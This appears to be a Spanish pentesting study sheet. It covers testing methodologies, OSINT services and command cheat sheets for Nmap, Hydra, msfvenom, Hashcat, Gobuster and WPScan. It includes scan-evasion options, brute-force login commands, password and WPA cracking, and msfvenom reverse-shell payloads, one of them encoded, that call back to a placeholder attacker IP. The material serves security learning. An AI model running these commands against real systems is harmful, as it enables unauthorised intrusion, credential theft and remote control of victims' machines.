# Metodologías de Pentesting

## PTES (Penetration Testing Execution Standard)
Un estándar diseñado para proporcionar un marco común en la ejecución de pruebas de penetración. Define metodologías y procedimientos detallados para realizar auditorías técnicas de seguridad tanto en empresas como en proveedores de servicios.

## OWASP (Open Web Application Security Project)
Organización sin ánimo de lucro dedicada a mejorar la seguridad de las aplicaciones web. Ofrece metodologías, guías y herramientas de seguridad, destacando el OWASP Top 10, un ranking de las vulnerabilidades más críticas en aplicaciones web.

## OSSTM (Open Source Security Testing Methodology Manual)
Manual que proporciona un marco de trabajo detallado para la ejecución de auditorías de seguridad. Describe las fases y técnicas a seguir en un pentesting completo.

## MITRE ATT&CK
Marco de referencia que documenta tácticas, técnicas y procedimientos utilizados por atacantes en escenarios reales. Se utiliza en equipos de Red Team y Blue Team para entender, mitigar y simular amenazas.

---

# Hacking – Conceptos Técnicos Previos

- **Target**: Objetivo (sistema, máquina, empresa, web…) que será evaluado o atacado.
- **CTF (Capture The Flag)**: Competición de seguridad informática donde los participantes deben explotar vulnerabilidades en sistemas para obtener *flags* que demuestran el acceso.
- **Alcance**: Nivel de profundidad con el que se ejecuta una auditoría de seguridad.
- **VPN (Virtual Private Network)**: Red privada virtual que crea un túnel seguro entre dos puntos sobre internet.
- **Vulnerabilidad**: Punto débil en un sistema que puede ser explotado por un atacante.
- **Exploit**: Código diseñado para aprovechar una vulnerabilidad y permitir la ejecución de acciones en el sistema.
- **Payload**: Código que ejecuta una acción maliciosa tras la explotación de una vulnerabilidad.
- **0-Day**: Vulnerabilidad no conocida por el proveedor o sin un parche disponible, lo que permite a los atacantes explotarla sin restricciones.

---

# Recolección de Información / Reconocimiento

## OSINT (Open Source Intelligence)
Técnicas y herramientas utilizadas para obtener información pública de un objetivo.

- **Google Dorks**: Uso de operadores avanzados de búsqueda en Google para encontrar información sensible.
- **[Shodan](https://www.shodan.io/)**: Motor de búsqueda de dispositivos conectados a internet.
- **[Robtex](https://www.robtex.com/)**: Herramienta de análisis de redes y dominios.
- **[DNSDumpster](https://dnsdumpster.com/)**: Servicio de recolección de información DNS y mapeo de infraestructura.
- **[Nslookup](https://www.nslookup.io/)**: Comando para realizar consultas DNS.
- **[Dig](https://toolbox.googleapps.com/apps/dig/)**: Herramienta avanzada para consultas DNS.
- **[Maltego](https://www.maltego.com/)**: Plataforma de análisis de relaciones y visualización de datos para OSINT.
- **[The Harvester](https://www.osintux.org/documentacion/the-harvester)**: Herramienta para recopilar correos electrónicos, subdominios e información de servidores mediante OSINT.
- **[Censys](https://search.censys.io/)**: Motor de búsqueda de activos en internet similar a Shodan.
- **[Hunter.io](https://hunter.io/)**: Servicio para encontrar direcciones de correo electrónico asociadas a un dominio.
- **[Phonebook.cz](https://phonebook.cz/)**: Herramienta OSINT para recopilar información sobre dominios y direcciones de correo.
- **[Verify Email Address](https://www.verifyemailaddress.org/)**: Servicio para validar la existencia de direcciones de correo electrónico.

---

## Enumeración / Escaneo
Proceso de identificación de servicios, puertos y usuarios en el sistema objetivo.

- **Ping**: Comprobación de disponibilidad de un host en la red.
- **arp-scan**: Escaneo de direcciones MAC en la red.
- **Nmap**: Escaneo de red y detección de servicios.
  - Uso de *scripts NSE* para identificar vulnerabilidades y servicios.
  - Técnicas de *firewall evasion* para saltar restricciones de seguridad.
  - Escaneo de *RDP* para detectar servicios de escritorio remoto.
- **Netdiscover**: Descubrimiento de dispositivos en una red local.
- **Smbclient**: Cliente SMB para interactuar con recursos compartidos en redes Windows.
- **Nbtscan**: Escaneo de redes para obtener información sobre NetBIOS.
- **Enum4Linux**: Herramienta para enumerar usuarios y recursos en sistemas Windows vía SMB.
- **AutoRecon**: Script de automatización de escaneos con Nmap y otras herramientas ([Repositorio en GitHub](https://github.com/Tib3rius/AutoRecon)).

---

# Nmap Cheatsheet

## Nmap - Trace the Packets
```bash
nmap --traceroute 192.168.1.1
```

## Connect Scan
```bash
nmap -sT 192.168.1.1
```

## Filtered Ports
```bash
nmap -p 22,80,443 --open 192.168.1.1
```

## Discovering Open UDP Ports
```bash
nmap -sU -p- 192.168.1.1
```

## Version Scan
```bash
nmap -sV 192.168.1.1
```

## Saving the Results
```bash
nmap -oN output.txt 192.168.1.1
nmap -oX output.xml 192.168.1.1
```

## Service Version Detection
```bash
nmap -sV 192.168.1.1
```

## Banner Grabbing
```bash
nmap -sV --script=banner 192.168.1.1
```

## Tcpdump
```bash
tcpdump -i eth0
```

## Nc (Netcat)
```bash
nc -zv 192.168.1.1 22-443
```

## Tcpdump - Intercepted Traffic
```bash
tcpdump -i eth0 port 80
```

## Nmap Scripting Engine
```bash
nmap --script=vuln 192.168.1.1
```

## Specific Scripts Category
```bash
nmap --script=auth 192.168.1.1
```

## Nmap - Specifying Scripts
```bash
nmap --script=http-title 192.168.1.1
```

## Nmap - Aggressive Scan
```bash
nmap -A 192.168.1.1
```

## Nmap - Vuln Category
```bash
nmap --script=vulners 192.168.1.1
```

## Timing and Optimization
```bash
nmap -T4 192.168.1.1
nmap --max-retries 2 192.168.1.1
```

## SYN-Scan
```bash
nmap -sS 192.168.1.1
```

## ACK-Scan
```bash
nmap -sA 192.168.1.1
```

## Detect IDS/IPS
```bash
nmap -sS --scan-delay 500ms 192.168.1.1
```

## Decoys
```bash
nmap -D RND:10 192.168.1.1
```

## Scan by Using Decoys
```bash
nmap -D 192.168.1.2,192.168.1.3,ME 192.168.1.1
```

## Testing Firewall Rule
```bash
nmap -p 80 --badsum 192.168.1.1
```

## Scan by Using Different Source IP
```bash
nmap --source-port 53 192.168.1.1
```

## DNS Proxying
```bash
nmap --dns-servers 8.8.8.8 192.168.1.1
```

## SYN-Scan of a Filtered Port
```bash
nmap -sS -p 443 192.168.1.1
```

## SYN-Scan From DNS Port
```bash
nmap -sS --source-port 53 192.168.1.1
```

## Connect To The Filtered Port
```bash
nmap -sT -p 443 192.168.1.1
```


# Hydra Cheatsheet

## Brute Force SSH Login
```bash
hydra -l user -P passwords.txt ssh://192.168.1.1
```

## Brute Force FTP Login
```bash
hydra -l user -P passwords.txt ftp://192.168.1.1
```

## Brute Force HTTP Basic Authentication
```bash
hydra -l admin -P passwords.txt 192.168.1.1 http-get /admin
```

## Brute Force HTTP Form Authentication
```bash
hydra -l admin -P passwords.txt 192.168.1.1 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
```

## Brute Force MySQL Login
```bash
hydra -l root -P passwords.txt mysql://192.168.1.1
```

## Brute Force PostgreSQL Login
```bash
hydra -l postgres -P passwords.txt postgres://192.168.1.1
```

## Brute Force RDP Login
```bash
hydra -l Administrator -P passwords.txt rdp://192.168.1.1
```

# Msfvenom Cheatsheet

## Generar un Payload para Windows
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<tu_IP> LPORT=<puerto> -f exe > shell.exe
```

## Generar un Payload para Linux
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<tu_IP> LPORT=<puerto> -f elf > shell.elf
```

## Generar un Payload para Android
```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=<tu_IP> LPORT=<puerto> -o shell.apk
```

## Generar Shellcode en Formato C
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<tu_IP> LPORT=<puerto> -f c
```

## Obtener la Lista de Formatos Disponibles
```bash
msfvenom --list formats
```

## Ver la Lista de Payloads Disponibles
```bash
msfvenom --list payloads
```

## Codificar un Payload con Shikata Ga Nai
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<tu_IP> LPORT=<puerto> -e x86/shikata_ga_nai -i 5 -f exe > shell_encoded.exe
```

# Hashcat Cheatsheet

## Dictionary Attack
```bash
hashcat -m <hash_mode> -a 0 <hash_file> <wordlist>
```

## Combination Attack
```bash
hashcat -m <hash_mode> -a 1 <hash_file> <wordlist1> <wordlist2>
```

## Mask Attack
```bash
hashcat -m <hash_mode> -a 3 <hash_file> ?a?a?a?a
```

## Hybrid Mode
```bash
hashcat -m <hash_mode> -a 6 <hash_file> <wordlist> ?a?a
```

## Creating Custom Wordlists
```bash
crunch 8 10 abcdefghijklmnopqrstuvwxyz -o wordlist.txt
```

## Working with Rules
```bash
hashcat -r rules/best64.rule -m <hash_mode> -a 0 <hash_file> <wordlist>
```

## Cracking Common Hashes
```bash
hashcat -m 0 -a 0 hash.txt rockyou.txt
```

## Cracking Miscellaneous Files & Hashes
```bash
hashcat -m 1000 -a 0 hash.txt wordlist.txt
```

## Cracking Wireless (WPA/WPA2) Handshakes with Hashcat
```bash
hashcat -m 2500 -a 0 handshake.hccapx wordlist.txt
```

# SSLScan Cheatsheet

## Escanear un dominio en busca de protocolos SSL/TLS
```bash
sslscan <dominio>
```

## Escanear un puerto específico
```bash
sslscan --no-failed --port 443 <dominio>
```

# Hacking with Curl

Recursos:
- [GitHub: Hacking With Curl](https://github.com/frizb/HackingWithCurl)
- [Artículo: Hacking with Curl](https://manasharsh.medium.com/hacking-with-curl-unleash-the-cli-beast-fdf13ec342cc)
- [Cheatsheet: Curl](https://www.stationx.net/curl-cheat-sheet/)

## Obtener encabezados HTTP de un sitio web
```bash
curl -I <url>
```

## Enviar una solicitud GET
```bash
curl -X GET <url>
```

## Enviar una solicitud POST con datos
```bash
curl -X POST -d "param1=value1&param2=value2" <url>
```

# Gobuster Cheatsheet

## Enumerar directorios en un sitio web
```bash
gobuster dir -u <url> -w /usr/share/wordlists/dirb/common.txt
```

## Enumerar subdominios
```bash
gobuster dns -d <dominio> -w /usr/share/wordlists/subdomains.txt
```

# Dirsearch Cheatsheet

## Escanear directorios en un sitio web
```bash
python3 dirsearch.py -u <url> -e php,html,txt
```

# Wpscan Cheatsheet

## Escanear un sitio WordPress en busca de vulnerabilidades
```bash
wpscan --url <url> --enumerate vp
```

## Enumerar usuarios de WordPress
```bash
wpscan --url <url> --enumerate u
```

## Escanear plugins vulnerables
```bash
wpscan --url <url> --enumerate p
```









